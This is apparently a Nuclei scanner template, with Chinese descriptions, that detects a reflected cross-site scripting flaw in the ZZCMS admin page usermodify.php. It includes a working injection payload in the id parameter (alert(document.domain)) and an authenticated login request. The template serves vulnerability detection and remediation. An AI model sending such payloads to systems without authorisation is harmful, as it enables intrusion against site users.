id: zzcms-xss

info:
  name: ZZCMS - 跨站脚本漏洞
  author: ritikchaddha
  severity: high
  description: |
    该模板用于检测 ZZCMS - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/admin/logincheck.php`、`/admin/usermodify.php?id=1%22%2balert(document.domain)%2b%22` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://github.com/JcQSteven/blog/issues/20
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 2
  tags: zzcms,xss,authenticated,vuln

http:
  - raw:
      - |
        POST /admin/logincheck.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        admin={{username}}&pass={{password}}
      - |
        GET /admin/usermodify.php?id=1%22%2balert(document.domain)%2b%22 HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "contains(header_2, 'text/html')"
          - "status_code_2 == 200"
          - 'contains(body_2, "参数 1\"+alert(document.domain)+")'
        condition: and
